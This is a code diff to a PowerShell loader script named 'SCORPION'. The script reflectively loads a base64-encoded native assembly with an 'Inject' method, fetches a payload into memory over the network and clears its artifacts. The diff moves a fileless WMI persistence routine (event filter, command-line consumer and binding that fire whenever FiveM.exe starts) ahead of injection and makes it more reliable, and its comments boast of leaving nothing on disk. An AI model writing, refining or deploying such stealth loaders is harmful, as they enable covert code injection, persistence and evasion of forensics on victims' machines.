@@ -1,4 +1,4 @@
-﻿# SCORPION â€” in-memory runtime. Nothing is written to disk by this script.
+# SCORPION â€” in-memory runtime. Nothing is written to disk by this script.
 # Generated into a one-liner by make_link.ps1. Do not run this file directly.
 $ErrorActionPreference = 'Stop'
 
@@ -25,6 +25,25 @@ $NativeB64 = 'TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 $asm = [Reflection.Assembly]::Load([Convert]::FromBase64String($NativeB64))
 $nativeType = $asm.GetType('ScorpionNative')
 $inject = $nativeType.GetMethod('Inject', [Reflection.BindingFlags]'Public,Static')
+
+# -- WMI-only persistence (no script file anywhere) --------------------------
+# Installed BEFORE injection so a failed inject never kills auto-start.
+# __InstanceCreationEvent polls every 2s and is more reliable than
+# Win32_ProcessStartTrace, which needs the kernel trace enabled.
+function Install-Persistence {
+    if ($LaunchCommand -like '__*') { return }
+    $f = Set-WmiInstance -Namespace $NS -Class __EventFilter -Arguments @{
+        Name = $Filter; EventNamespace = 'root\cimv2'; QueryLanguage = 'WQL'
+        Query = "SELECT * FROM __InstanceCreationEvent WITHIN 2 WHERE TargetInstance ISA 'Win32_Process' AND TargetInstance.Name = 'FiveM.exe'"
+    } -ErrorAction Stop
+    $c = Set-WmiInstance -Namespace $NS -Class CommandLineEventConsumer -Arguments @{
+        Name = $Consumer; CommandLineTemplate = $LaunchCommand
+    } -ErrorAction Stop
+    $null = Set-WmiInstance -Namespace $NS -Class __FilterToConsumerBinding -Arguments @{
+        Filter = $f; Consumer = $c
+    } -ErrorAction Stop
+}
+Install-Persistence
 
 # -- fetch payload into memory (never saved to disk) -------------------------
 $wc = New-Object System.Net.WebClient
@@ -63,23 +82,6 @@ function Clear-Artifacts {
     } catch {}
 }
 Clear-Artifacts
-
-# -- WMI-only persistence (no script file anywhere) --------------------------
-function Install-Persistence {
-    if ($LaunchCommand -like '__*') { return }
-    $f = Set-WmiInstance -Namespace $NS -Class __EventFilter -Arguments @{
-        Name = $Filter; EventNamespace = 'root\cimv2'; QueryLanguage = 'WQL'
-        Query = "SELECT * FROM Win32_ProcessStartTrace WHERE ProcessName = 'FiveM.exe'"
-    } -ErrorAction Stop
-    $c = Set-WmiInstance -Namespace $NS -Class CommandLineEventConsumer -Arguments @{
-        Name = $Consumer; CommandLineTemplate = $LaunchCommand
-    } -ErrorAction Stop
-    $null = Set-WmiInstance -Namespace $NS -Class __FilterToConsumerBinding -Arguments @{
-        Filter = $f; Consumer = $c
-    } -ErrorAction Stop
-}
-
-if ($ok) { Install-Persistence }
 
 $NativeB64 = $null
 $asm = $null
